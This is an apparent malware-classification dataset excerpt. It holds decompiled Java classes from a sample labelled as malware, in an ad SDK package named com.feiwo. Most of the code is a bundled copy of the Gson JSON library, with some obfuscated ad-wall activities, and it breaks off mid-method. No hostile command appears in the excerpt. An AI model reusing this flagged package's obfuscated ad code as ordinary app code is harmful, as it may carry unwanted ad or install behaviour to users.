list.add(TreeTypeAdapter.newFactory(TypeToken.get(java.sql.Date.class),defaultDateTypeAdapter));   }   public GsonBuilder addDeserializationExclusionStrategy(  ExclusionStrategy exclusionStrategy){     this.excluder=this.excluder.withExclusionStrategy(exclusionStrategy,false,true);     return this;   }   public GsonBuilder addSerializationExclusionStrategy(  ExclusionStrategy exclusionStrategy){     this.excluder=this.excluder.withExclusionStrategy(exclusionStrategy,true,false);     return this;   }   public Gson create(){     ArrayList arrayList=new ArrayList();     arrayList.addAll(this.factories);     Collections.reverse(arrayList);     arrayList.addAll(this.hierarchyFactories);     addTypeAdaptersForDate(this.datePattern,this.dateStyle,this.timeStyle,arrayList);     return new Gson(this.excluder,this.fieldNamingPolicy,this.instanceCreators,this.serializeNulls,this.complexMapKeySerialization,this.generateNonExecutableJson,this.escapeHtmlChars,this.prettyPrinting,this.serializeSpecialFloatingPointValues,this.longSerializationPolicy,arrayList);   }   public GsonBuilder disableHtmlEscaping(){     this.escapeHtmlChars=false;     return this;   }   public GsonBuilder disableInnerClassSerialization(){     this.excluder=this.excluder.disableInnerClassSerialization();     return this;   }   public GsonBuilder enableComplexMapKeySerialization(){     this.complexMapKeySerialization=true;     return this;   }   public GsonBuilder excludeFieldsWithModifiers(  int... iArr){     this.excluder=this.excluder.withModifiers(iArr);     return this;   }   public GsonBuilder excludeFieldsWithoutExposeAnnotation(){     this.excluder=this.excluder.excludeFieldsWithoutExposeAnnotation();     return this;   }   public GsonBuilder generateNonExecutableJson(){     this.generateNonExecutableJson=true;     return this;   }   public GsonBuilder registerTypeAdapter(  Type type,  Object obj){     C$Gson$Preconditions.checkArgument((obj instanceof JsonSerializer) || (obj instanceof JsonDeserializer) || (obj instanceof InstanceCreator)|| (obj instanceof TypeAdapter));     if (obj instanceof InstanceCreator) {       this.instanceCreators.put(type,(InstanceCreator)obj);     }     if ((obj instanceof JsonSerializer) || (obj instanceof JsonDeserializer)) {       this.factories.add(TreeTypeAdapter.newFactoryWithMatchRawType(TypeToken.get(type),obj));     }     if (obj instanceof TypeAdapter) {       this.factories.add(TypeAdapters.newFactory(TypeToken.get(type),(TypeAdapter)obj));     }     return this;   }   public GsonBuilder registerTypeAdapterFactory(  TypeAdapterFactory typeAdapterFactory){     this.factories.add(typeAdapterFactory);     return this;   }   public GsonBuilder registerTypeHierarchyAdapter(  Class<?> cls,  Object obj){     C$Gson$Preconditions.checkArgument((obj instanceof JsonSerializer) || (obj instanceof JsonDeserializer) || (obj instanceof TypeAdapter));     if ((obj instanceof JsonDeserializer) || (obj instanceof JsonSerializer)) {       this.hierarchyFactories.add(0,TreeTypeAdapter.newTypeHierarchyFactory(cls,obj));     }     if (obj instanceof TypeAdapter) {       this.factories.add(TypeAdapters.newTypeHierarchyFactory(cls,(TypeAdapter)obj));     }     return this;   }   public GsonBuilder serializeNulls(){     this.serializeNulls=true;     return this;   }   public GsonBuilder serializeSpecialFloatingPointValues(){     this.serializeSpecialFloatingPointValues=true;     return this;   }   public GsonBuilder setDateFormat(  int i){     this.dateStyle=i;     this.datePattern=null;     return this;   }   public GsonBuilder setDateFormat(  int i,  int i2){     this.dateStyle=i;     this.timeStyle=i2;     this.datePattern=null;     return this;   }   public GsonBuilder setDateFormat(  String str){     this.datePattern=str;     return this;   }   public GsonBuilder setExclusionStrategies(  ExclusionStrategy... exclusionStrategyArr){     for (    ExclusionStrategy exclusionStrategy : exclusionStrategyArr) {       this.excluder=this.excluder.withExclusionStrategy(exclusionStrategy,true,true);     }     return this;   }   public GsonBuilder setFieldNamingPolicy(  FieldNamingPolicy fieldNamingPolicy){     this.fieldNamingPolicy=fieldNamingPolicy;     return this;   }   public GsonBuilder setFieldNamingStrategy(  FieldNamingStrategy fieldNamingStrategy){     this.fieldNamingPolicy=fieldNamingStrategy;     return this;   }   public GsonBuilder setLongSerializationPolicy(  LongSerializationPolicy longSerializationPolicy){     this.longSerializationPolicy=longSerializationPolicy;     return this;   }   public GsonBuilder setPrettyPrinting(){     this.prettyPrinting=true;     return this;   }   public GsonBuilder setVersion(  double d){     this.excluder=this.excluder.withVersion(d);     return this;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\h.code","final class h extends TypeToken<List<PushAdInfo>> { } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\i.code","final class i extends TypeToken<List<CreditsWallAdInfo>> { } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\InstanceCreator.code","public interface InstanceCreator<T> {   T createInstance(  Type type); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\j.code","final class j extends TypeToken<List<PushAdInfo>> { } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\JsonArray.code","public final class JsonArray extends JsonElement implements Iterable<JsonElement> {   private final List<JsonElement> elements=new ArrayList();   public void add(  JsonElement jsonElement){     if (jsonElement == null) {       jsonElement=JsonNull.INSTANCE;     }     this.elements.add(jsonElement);   }   public void addAll(  JsonArray jsonArray){     this.elements.addAll(jsonArray.elements);   }   @Override public JsonArray deepCopy(){     JsonArray jsonArray=new JsonArray();     Iterator<JsonElement> it=this.elements.iterator();     while (it.hasNext()) {       jsonArray.add(it.next().deepCopy());     }     return jsonArray;   }   public boolean equals(  Object obj){     return obj == this || ((obj instanceof JsonArray) && ((JsonArray)obj).elements.equals(this.elements));   }   public JsonElement get(  int i){     return this.elements.get(i);   }   @Override public BigDecimal getAsBigDecimal(){     if (this.elements.size() == 1) {       return this.elements.get(0).getAsBigDecimal();     }     throw new IllegalStateException();   }   @Override public BigInteger getAsBigInteger(){     if (this.elements.size() == 1) {       return this.elements.get(0).getAsBigInteger();     }     throw new IllegalStateException();   }   @Override public boolean getAsBoolean(){     if (this.elements.size() == 1) {       return this.elements.get(0).getAsBoolean();     }     throw new IllegalStateException();   }   @Override public byte getAsByte(){     if (this.elements.size() == 1) {       return this.elements.get(0).getAsByte();     }     throw new IllegalStateException();   }   @Override public char getAsCharacter(){     if (this.elements.size() == 1) {       return this.elements.get(0).getAsCharacter();     }     throw new IllegalStateException();   }   @Override public double getAsDouble(){     if (this.elements.size() == 1) {       return this.elements.get(0).getAsDouble();     }     throw new IllegalStateException();   }   @Override public float getAsFloat(){     if (this.elements.size() == 1) {       return this.elements.get(0).getAsFloat();     }     throw new IllegalStateException();   }   @Override public int getAsInt(){     if (this.elements.size() == 1) {       return this.elements.get(0).getAsInt();     }     throw new IllegalStateException();   }   @Override public long getAsLong(){     if (this.elements.size() == 1) {       return this.elements.get(0).getAsLong();     }     throw new IllegalStateException();   }   @Override public Number getAsNumber(){     if (this.elements.size() == 1) {       return this.elements.get(0).getAsNumber();     }     throw new IllegalStateException();   }   @Override public short getAsShort(){     if (this.elements.size() == 1) {       return this.elements.get(0).getAsShort();     }     throw new IllegalStateException();   }   @Override public String getAsString(){     if (this.elements.size() == 1) {       return this.elements.get(0).getAsString();     }     throw new IllegalStateException();   }   public int hashCode(){     return this.elements.hashCode();   }   @Override public Iterator<JsonElement> iterator(){     return this.elements.iterator();   }   public int size(){     return this.elements.size();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\JsonDeserializationContext.code","public interface JsonDeserializationContext {   <T>T deserialize(  JsonElement jsonElement,  Type type); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\JsonDeserializer.code","public interface JsonDeserializer<T> {   T deserialize(  JsonElement jsonElement,  Type type,  JsonDeserializationContext jsonDeserializationContext); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\JsonElement.code","public abstract class JsonElement {   public abstract JsonElement deepCopy();   public BigDecimal getAsBigDecimal(){     throw new UnsupportedOperationException(getClass().getSimpleName());   }   public BigInteger getAsBigInteger(){     throw new UnsupportedOperationException(getClass().getSimpleName());   }   public boolean getAsBoolean(){     throw new UnsupportedOperationException(getClass().getSimpleName());   }   Boolean getAsBooleanWrapper(){     throw new UnsupportedOperationException(getClass().getSimpleName());   }   public byte getAsByte(){     throw new UnsupportedOperationException(getClass().getSimpleName());   }   public char getAsCharacter(){     throw new UnsupportedOperationException(getClass().getSimpleName());   }   public double getAsDouble(){     throw new UnsupportedOperationException(getClass().getSimpleName());   }   public float getAsFloat(){     throw new UnsupportedOperationException(getClass().getSimpleName());   }   public int getAsInt(){     throw new UnsupportedOperationException(getClass().getSimpleName());   }   public JsonArray getAsJsonArray(){     if (isJsonArray()) {       return (JsonArray)this;     }     throw new IllegalStateException(""This is not a JSON Array."");   }   public JsonNull getAsJsonNull(){     if (isJsonNull()) {       return (JsonNull)this;     }     throw new IllegalStateException(""This is not a JSON Null."");   }   public JsonObject getAsJsonObject(){     if (isJsonObject()) {       return (JsonObject)this;     }     throw new IllegalStateException(""Not a JSON Object: "" + this);   }   public JsonPrimitive getAsJsonPrimitive(){     if (isJsonPrimitive()) {       return (JsonPrimitive)this;     }     throw new IllegalStateException(""This is not a JSON Primitive."");   }   public long getAsLong(){     throw new UnsupportedOperationException(getClass().getSimpleName());   }   public Number getAsNumber(){     throw new UnsupportedOperationException(getClass().getSimpleName());   }   public short getAsShort(){     throw new UnsupportedOperationException(getClass().getSimpleName());   }   public String getAsString(){     throw new UnsupportedOperationException(getClass().getSimpleName());   }   public boolean isJsonArray(){     return this instanceof JsonArray;   }   public boolean isJsonNull(){     return this instanceof JsonNull;   }   public boolean isJsonObject(){     return this instanceof JsonObject;   }   public boolean isJsonPrimitive(){     return this instanceof JsonPrimitive;   }   public String toString(){     try {       StringWriter stringWriter=new StringWriter();       JsonWriter jsonWriter=new JsonWriter(stringWriter);       jsonWriter.setLenient(true);       Streams.write(this,jsonWriter);       return stringWriter.toString();     }  catch (    IOException e) {       throw new AssertionError(e);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\JsonIOException.code","public final class JsonIOException extends JsonParseException {   private static final long serialVersionUID=1;   public JsonIOException(  String str){     super(str);   }   public JsonIOException(  String str,  Throwable th){     super(str,th);   }   public JsonIOException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\JsonNull.code","public final class JsonNull extends JsonElement {   public static final JsonNull INSTANCE=new JsonNull();   @Deprecated public JsonNull(){   }   @Override public JsonNull deepCopy(){     return INSTANCE;   }   public boolean equals(  Object obj){     return this == obj || (obj instanceof JsonNull);   }   public int hashCode(){     return JsonNull.class.hashCode();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\JsonObject.code","public final class JsonObject extends JsonElement {   private final LinkedTreeMap<String,JsonElement> members=new LinkedTreeMap<>();   private JsonElement createJsonElement(  Object obj){     return obj == null ? JsonNull.INSTANCE : new JsonPrimitive(obj);   }   public void add(  String str,  JsonElement jsonElement){     if (jsonElement == null) {       jsonElement=JsonNull.INSTANCE;     }     this.members.put(str,jsonElement);   }   public void addProperty(  String str,  Boolean bool){     add(str,createJsonElement(bool));   }   public void addProperty(  String str,  Character ch){     add(str,createJsonElement(ch));   }   public void addProperty(  String str,  Number number){     add(str,createJsonElement(number));   }   public void addProperty(  String str,  String str2){     add(str,createJsonElement(str2));   }   @Override public JsonObject deepCopy(){     JsonObject jsonObject=new JsonObject();     for (    Map.Entry<String,JsonElement> entry : this.members.entrySet()) {       jsonObject.add(entry.getKey(),entry.getValue().deepCopy());     }     return jsonObject;   }   public Set<Map.Entry<String,JsonElement>> entrySet(){     return this.members.entrySet();   }   public boolean equals(  Object obj){     return obj == this || ((obj instanceof JsonObject) && ((JsonObject)obj).members.equals(this.members));   }   public JsonElement get(  String str){     return this.members.get(str);   }   public JsonArray getAsJsonArray(  String str){     return (JsonArray)this.members.get(str);   }   public JsonObject getAsJsonObject(  String str){     return (JsonObject)this.members.get(str);   }   public JsonPrimitive getAsJsonPrimitive(  String str){     return (JsonPrimitive)this.members.get(str);   }   public boolean has(  String str){     return this.members.containsKey(str);   }   public int hashCode(){     return this.members.hashCode();   }   public JsonElement remove(  String str){     return this.members.remove(str);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\JsonParseException.code","public class JsonParseException extends RuntimeException {   static final long serialVersionUID=-4086729973971783390L;   public JsonParseException(  String str){     super(str);   }   public JsonParseException(  String str,  Throwable th){     super(str,th);   }   public JsonParseException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\JsonParser.code","public final class JsonParser {   public JsonElement parse(  JsonReader jsonReader){     boolean isLenient=jsonReader.isLenient();     jsonReader.setLenient(true);     try {       try {         try {           return Streams.parse(jsonReader);         }  catch (        OutOfMemoryError e) {           throw new JsonParseException(""Failed parsing JSON source: "" + jsonReader + "" to Json"",e);         }       }  catch (      StackOverflowError e2) {         throw new JsonParseException(""Failed parsing JSON source: "" + jsonReader + "" to Json"",e2);       }     }   finally {       jsonReader.setLenient(isLenient);     }   }   public JsonElement parse(  Reader reader){     try {       JsonReader jsonReader=new JsonReader(reader);       JsonElement parse=parse(jsonReader);       if (parse.isJsonNull() || jsonReader.peek() == JsonToken.END_DOCUMENT) {         return parse;       }       throw new JsonSyntaxException(""Did not consume the entire document."");     }  catch (    MalformedJsonException e) {       throw new JsonSyntaxException(e);     } catch (    IOException e2) {       throw new JsonIOException(e2);     } catch (    NumberFormatException e3) {       throw new JsonSyntaxException(e3);     }   }   public JsonElement parse(  String str){     return parse(new StringReader(str));   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\JsonPrimitive.code","public final class JsonPrimitive extends JsonElement {   private static final Class<?>[] PRIMITIVE_TYPES={Integer.TYPE,Long.TYPE,Short.TYPE,Float.TYPE,Double.TYPE,Byte.TYPE,Boolean.TYPE,Character.TYPE,Integer.class,Long.class,Short.class,Float.class,Double.class,Byte.class,Boolean.class,Character.class};   private Object value;   public JsonPrimitive(  Boolean bool){     setValue(bool);   }   public JsonPrimitive(  Character ch){     setValue(ch);   }   public JsonPrimitive(  Number number){     setValue(number);   }   public JsonPrimitive(  Object obj){     setValue(obj);   }   public JsonPrimitive(  String str){     setValue(str);   }   private static boolean isIntegral(  JsonPrimitive jsonPrimitive){     if (!(jsonPrimitive.value instanceof Number)) {       return false;     }     Number number=(Number)jsonPrimitive.value;     return (number instanceof BigInteger) || (number instanceof Long) || (number instanceof Integer)|| (number instanceof Short)|| (number instanceof Byte);   }   private static boolean isPrimitiveOrString(  Object obj){     if (obj instanceof String) {       return true;     }     Class<?> cls=obj.getClass();     for (    Class<?> cls2 : PRIMITIVE_TYPES) {       if (cls2.isAssignableFrom(cls)) {         return true;       }     }     return false;   }   @Override public JsonPrimitive deepCopy(){     return this;   }   public boolean equals(  Object obj){     boolean z=false;     if (this == obj) {       return true;     }     if (obj == null || getClass() != obj.getClass()) {       return false;     }     JsonPrimitive jsonPrimitive=(JsonPrimitive)obj;     if (this.value == null) {       return jsonPrimitive.value == null;     }     if (isIntegral(this) && isIntegral(jsonPrimitive)) {       return getAsNumber().longValue() == jsonPrimitive.getAsNumber().longValue();     }     if (!(this.value instanceof Number) || !(jsonPrimitive.value instanceof Number)) {       return this.value.equals(jsonPrimitive.value);     }     double doubleValue=getAsNumber().doubleValue();     double doubleValue2=jsonPrimitive.getAsNumber().doubleValue();     if (doubleValue == doubleValue2 || (Double.isNaN(doubleValue) && Double.isNaN(doubleValue2))) {       z=true;     }     return z;   }   @Override public BigDecimal getAsBigDecimal(){     return this.value instanceof BigDecimal ? (BigDecimal)this.value : new BigDecimal(this.value.toString());   }   @Override public BigInteger getAsBigInteger(){     return this.value instanceof BigInteger ? (BigInteger)this.value : new BigInteger(this.value.toString());   }   @Override public boolean getAsBoolean(){     return isBoolean() ? getAsBooleanWrapper().booleanValue() : Boolean.parseBoolean(getAsString());   }   @Override Boolean getAsBooleanWrapper(){     return (Boolean)this.value;   }   @Override public byte getAsByte(){     return isNumber() ? getAsNumber().byteValue() : Byte.parseByte(getAsString());   }   @Override public char getAsCharacter(){     return getAsString().charAt(0);   }   @Override public double getAsDouble(){     return isNumber() ? getAsNumber().doubleValue() : Double.parseDouble(getAsString());   }   @Override public float getAsFloat(){     return isNumber() ? getAsNumber().floatValue() : Float.parseFloat(getAsString());   }   @Override public int getAsInt(){     return isNumber() ? getAsNumber().intValue() : Integer.parseInt(getAsString());   }   @Override public long getAsLong(){     return isNumber() ? getAsNumber().longValue() : Long.parseLong(getAsString());   }   @Override public Number getAsNumber(){     return this.value instanceof String ? new LazilyParsedNumber((String)this.value) : (Number)this.value;   }   @Override public short getAsShort(){     return isNumber() ? getAsNumber().shortValue() : Short.parseShort(getAsString());   }   @Override public String getAsString(){     return isNumber() ? getAsNumber().toString() : isBoolean() ? getAsBooleanWrapper().toString() : (String)this.value;   }   public int hashCode(){     if (this.value == null) {       return 31;     }     if (isIntegral(this)) {       long longValue=getAsNumber().longValue();       return (int)(longValue ^ (longValue >>> 32));     }     if (!(this.value instanceof Number)) {       return this.value.hashCode();     }     long doubleToLongBits=Double.doubleToLongBits(getAsNumber().doubleValue());     return (int)(doubleToLongBits ^ (doubleToLongBits >>> 32));   }   public boolean isBoolean(){     return this.value instanceof Boolean;   }   public boolean isNumber(){     return this.value instanceof Number;   }   public boolean isString(){     return this.value instanceof String;   }   void setValue(  Object obj){     if (obj instanceof Character) {       this.value=String.valueOf(((Character)obj).charValue());     }  else {       C$Gson$Preconditions.checkArgument((obj instanceof Number) || isPrimitiveOrString(obj));       this.value=obj;     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\JsonSerializationContext.code","public interface JsonSerializationContext {   JsonElement serialize(  Object obj);   JsonElement serialize(  Object obj,  Type type); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\JsonSerializer.code","public interface JsonSerializer<T> {   JsonElement serialize(  T t,  Type type,  JsonSerializationContext jsonSerializationContext); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\JsonStreamParser.code","public final class JsonStreamParser implements Iterator<JsonElement> {   private final Object lock;   private final JsonReader parser;   public JsonStreamParser(  Reader reader){     this.parser=new JsonReader(reader);     this.parser.setLenient(true);     this.lock=new Object();   }   public JsonStreamParser(  String str){     this(new StringReader(str));   }   @Override public boolean hasNext(){     boolean z; synchronized (this.lock) {       try {         z=this.parser.peek() != JsonToken.END_DOCUMENT;       }  catch (      MalformedJsonException e) {         throw new JsonSyntaxException(e);       } catch (      IOException e2) {         throw new JsonIOException(e2);       }     }     return z;   }   @Override public JsonElement next(){     if (!hasNext()) {       throw new NoSuchElementException();     }     try {       return Streams.parse(this.parser);     }  catch (    JsonParseException e) {       if (e.getCause() instanceof EOFException) {         throw new NoSuchElementException();       }       throw e;     } catch (    OutOfMemoryError e2) {       throw new JsonParseException(""Failed parsing JSON source to Json"",e2);     } catch (    StackOverflowError e3) {       throw new JsonParseException(""Failed parsing JSON source to Json"",e3);     }   }   @Override public void remove(){     throw new UnsupportedOperationException();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\JsonSyntaxException.code","public final class JsonSyntaxException extends JsonParseException {   private static final long serialVersionUID=1;   public JsonSyntaxException(  String str){     super(str);   }   public JsonSyntaxException(  String str,  Throwable th){     super(str,th);   }   public JsonSyntaxException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\k.code","public final class k extends TypeToken<RootNode<BannerAdInfo>> { } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\l.code","public final class l extends TypeToken<RootNode<TableplaqueAdInfo>> { } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\m.code","public final class m extends TypeToken<RootNode<PushAdInfo>> { } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\n.code","public final class n extends TypeToken<RootNode<CreditsWallAdInfo>> { } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\packageinfo.code","interface packageinfo { } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\RDA.code","public class RDA extends DA<AppWallAdInfo> {   private Rview B;   @Override public View a(  int i,  int i2){     if (i == 1) {       this.B=FwRecommendManage.getInstance().getBoundAView(this,i2);     }  else {       this.B=FwRecommendManage.getInstance().getAView(this,i2);     }     return this.B;   }   @Override public void a(){     super.a();     this.x=com.feiwo.i.b.a.a();     this.f66a=(AppWallAdInfo)getIntent().getSerializableExtra(com.feiwo.i.c.a.am);     this.v=getIntent().getStringExtra(com.feiwo.i.c.a.an);     this.w=getIntent().getIntExtra(com.feiwo.i.c.a.ao,-1);     this.z=((AppWallAdInfo)this.f66a).getHasBoundAd();   }   @Override public void b(){     super.b();     if (this.B != null) {       this.B.a();     }   }   @Override public void onCreate(  Bundle bundle){     super.onCreate(bundle);   }   @Override public void onDestroy(){     super.onDestroy();   }   @Override public void onNewIntent(  Intent intent){     super.onNewIntent(intent);   }   @Override protected void onPause(){     super.onPause();   }   @Override public void onResume(){     super.onResume();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\RLA.code","public class RLA extends BA implements View.OnClickListener, AdapterView.OnItemClickListener, aj {   private LinearLayout f50a;   private Button f51b;   private TextView c;   private LV d;   private com.feiwo.a.a e;   private RlodingView f;   private List<AppWallAdInfo> g;   private Handler h=new a(this);   private RLoadfailview i;   public void a(  List<AppWallAdInfo> list){     this.f50a.removeView(this.f);     this.i=new RLoadfailview(this);     this.i.setId(222);     this.i.setOnClickListener(this);     this.f50a.addView(this.i);   }   public void a(  List<AppWallAdInfo> list,  int i){     this.g=list;     this.d=new LV(this);     this.d.setLayoutParams(new LinearLayout.LayoutParams(-1,-1,1.0f));     this.d.setCacheColorHint(0);     this.d.setDivider(com.feiwo.i.b.f.a(this,com.feiwo.i.c.a.ar));     this.d.setDividerHeight(com.feiwo.i.b.e.a(this,2.0f));     this.d.setOnItemClickListener(this);     this.d.setCanLoadMore(true);     this.d.setLoadMoreListener(this);     this.e=new com.feiwo.a.a(this,this.g);     this.d.setAdapter((ListAdapter)this.e);     this.f50a.addView(this.d);     this.f50a.removeView(this.f);     if (i == 1) {       this.d.setCanLoadMore(false);     }   }   private void b(){     this.f50a=new LinearLayout(this);     this.f50a.setLayoutParams(new LinearLayout.LayoutParams(-1,-1));     this.f50a.setOrientation(1);     this.f50a.setBackgroundColor(Color.rgb(242,242,242));     RelativeLayout relativeLayout=new RelativeLayout(this);     relativeLayout.setLayoutParams(new RelativeLayout.LayoutParams(-1,com.feiwo.i.b.e.a(this,48.0f)));     relativeLayout.setBackgroundColor(Color.rgb(84,188,77));     this.f51b=new Button(this);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(com.feiwo.i.b.e.a(this,48.0f),com.feiwo.i.b.e.a(this,48.0f));     layoutParams.addRule(15);     this.f51b.setLayoutParams(layoutParams);     this.f51b.setBackgroundDrawable(com.feiwo.i.b.f.a(this,com.feiwo.i.c.a.ap));     this.f51b.setOnClickListener(this);     this.c=new TextView(this);     this.c.setLayoutParams(new RelativeLayout.LayoutParams(-1,-1));     this.c.setTextColor(-1);     this.c.setTextSize(18.6f);     this.c.setSingleLine();     this.c.setGravity(17);     this.c.setEllipsize(TextUtils.TruncateAt.valueOf(""END""));     this.c.setText(com.feiwo.i.c.a.ct);     relativeLayout.addView(this.f51b);     relativeLayout.addView(this.c);     this.f50a.addView(relativeLayout);     setContentView(this.f50a);     c();   }   public void b(  List<AppWallAdInfo> list){     this.d.a();   }   public void b(  List<AppWallAdInfo> list,  int i){     this.g.addAll(list);     this.e.notifyDataSetChanged();     if (i == 1) {       this.d.setCanLoadMore(false);     }  else {       this.d.a();     }   }   private void c(){     this.f=new RlodingView(this);     this.f50a.addView(this.f);     com.feiwo.g.a.a().a(0,false,this.h);   }   public void c(  List<AppWallAdInfo> list){   }   @Override public void a(){     Integer num=(Integer)ReDictory.x().c.a(com.feiwo.i.c.a.cp,new b(this).getType());     if (num == null) {       num=0;     }     com.feiwo.g.a.a().a(num.intValue(),true,this.h);   }   @Override public void onClick(  View view){     if (view == this.f51b) {       finish();     }  else     if (view.getId() == 222) {       this.f50a.removeView(this.i);       c();     }   }   @Override public void onCreate(  Bundle bundle){     super.onCreate(bundle);     b();   }   @Override public void onItemClick(  AdapterView<?> adapterView,  View view,  int i,  long j){     AppWallAdInfo appWallAdInfo=(AppWallAdInfo)adapterView.getAdapter().getItem(i);     if (appWallAdInfo != null) {       startActivity(com.feiwo.h.b.a(this,appWallAdInfo,ReDictory.x().w(),5));       ReDictory.x().b(appWallAdInfo);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\SingleTypeFactory.code","class SingleTypeFactory implements TypeAdapterFactory {   private final JsonDeserializer<?> deserializer;   private final TypeToken<?> exactType;   private final Class<?> hierarchyType;   private final boolean matchRawType;   private final JsonSerializer<?> serializer;   private SingleTypeFactory(  Object obj,  TypeToken<?> typeToken,  boolean z,  Class<?> cls){     this.serializer=obj instanceof JsonSerializer ? (JsonSerializer)obj : null;     this.deserializer=obj instanceof JsonDeserializer ? (JsonDeserializer)obj : null;     C$Gson$Preconditions.checkArgument((this.serializer == null && this.deserializer == null) ? false : true);     this.exactType=typeToken;     this.matchRawType=z;     this.hierarchyType=cls;   }   @Override public <T>TypeAdapter<T> create(  Gson gson,  TypeToken<T> typeToken){     if (this.exactType != null ? this.exactType.equals(typeToken) || (this.matchRawType && this.exactType.getType() == typeToken.getRawType()) : this.hierarchyType.isAssignableFrom(typeToken.getRawType())) {       return new TreeTypeAdapter(this.serializer,this.deserializer,gson,typeToken,this);     }     return null;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\TreeTypeAdapter.code","final class TreeTypeAdapter<T> extends TypeAdapter<T> {   private TypeAdapter<T> delegate;   private final JsonDeserializer<T> deserializer;   private final Gson gson;   private final JsonSerializer<T> serializer;   private final TypeAdapterFactory skipPast;   private final TypeToken<T> typeToken; class SingleTypeFactory implements TypeAdapterFactory {     private final JsonDeserializer<?> deserializer;     private final TypeToken<?> exactType;     private final Class<?> hierarchyType;     private final boolean matchRawType;     private final JsonSerializer<?> serializer;     private SingleTypeFactory(    Object obj,    TypeToken<?> typeToken,    boolean z,    Class<?> cls){       this.serializer=obj instanceof JsonSerializer ? (JsonSerializer)obj : null;       this.deserializer=obj instanceof JsonDeserializer ? (JsonDeserializer)obj : null;       C$Gson$Preconditions.checkArgument((this.serializer == null && this.deserializer == null) ? false : true);       this.exactType=typeToken;       this.matchRawType=z;       this.hierarchyType=cls;     }     @Override public <T>TypeAdapter<T> create(    Gson gson,    TypeToken<T> typeToken){       if (this.exactType != null ? this.exactType.equals(typeToken) || (this.matchRawType && this.exactType.getType() == typeToken.getRawType()) : this.hierarchyType.isAssignableFrom(typeToken.getRawType())) {         return new TreeTypeAdapter(this.serializer,this.deserializer,gson,typeToken,this);       }       return null;     }   }   private TreeTypeAdapter(  JsonSerializer<T> jsonSerializer,  JsonDeserializer<T> jsonDeserializer,  Gson gson,  TypeToken<T> typeToken,  TypeAdapterFactory typeAdapterFactory){     this.serializer=jsonSerializer;     this.deserializer=jsonDeserializer;     this.gson=gson;     this.typeToken=typeToken;     this.skipPast=typeAdapterFactory;   }   private TypeAdapter<T> delegate(){     TypeAdapter<T> typeAdapter=this.delegate;     if (typeAdapter != null) {       return typeAdapter;     }     TypeAdapter<T> delegateAdapter=this.gson.getDelegateAdapter(this.skipPast,this.typeToken);     this.delegate=delegateAdapter;     return delegateAdapter;   }   public static TypeAdapterFactory newFactory(  TypeToken<?> typeToken,  Object obj){     return new SingleTypeFactory(obj,typeToken,false,null);   }   public static TypeAdapterFactory newFactoryWithMatchRawType(  TypeToken<?> typeToken,  Object obj){     return new SingleTypeFactory(obj,typeToken,typeToken.getType() == typeToken.getRawType(),null);   }   public static TypeAdapterFactory 